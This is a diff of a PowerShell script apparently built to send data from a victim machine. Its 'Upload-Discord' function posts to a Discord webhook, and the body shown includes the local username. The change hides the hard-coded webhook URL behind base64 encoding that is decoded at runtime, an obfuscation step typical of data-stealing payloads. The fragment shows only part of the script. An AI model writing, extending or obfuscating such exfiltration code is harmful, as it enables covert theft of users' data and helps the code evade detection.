@@ -1,3 +1,5 @@
+$base64String = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjAzODU4MjI3MDcwMTYwMC90RS1PUnFSdXBPeG5qTXhsZldWaUFxM0ViQkJ3R3pBamlOOXJGUWZKd1Mza2xGZ0Nib0lnWXd0RWpPOUNHWTVILWluVA=="
+$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjAzODU4MjI3MDcwMTYwMC90RS1PUnFSdXBPeG5qTXhsZldWaUFxM0ViQkJ3R3pBamlOOXJGUWZKd1Mza2xGZ0Nib0lnWXd0RWpPOUNHWTVILWluVA=="))
 
 
 function Upload-Discord {
@@ -10,7 +12,7 @@ function Upload-Discord {
 		[string]$text 
 	)
 
-	$hookurl = 'https://discord.com/api/webhooks/1092038582270701600/tE-ORqRupOxnjMxlfWViAq3EbBBwGzAjiN9rFQfJwS3klFgCboIgYwtEjO9CGY5H-inT'
+	$hookurl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjAzODU4MjI3MDcwMTYwMC90RS1PUnFSdXBPeG5qTXhsZldWaUFxM0ViQkJ3R3pBamlOOXJGUWZKd1Mza2xGZ0Nib0lnWXd0RWpPOUNHWTVILWluVA=="))
 
 	$Body = @{
 	  'username' = $env:username
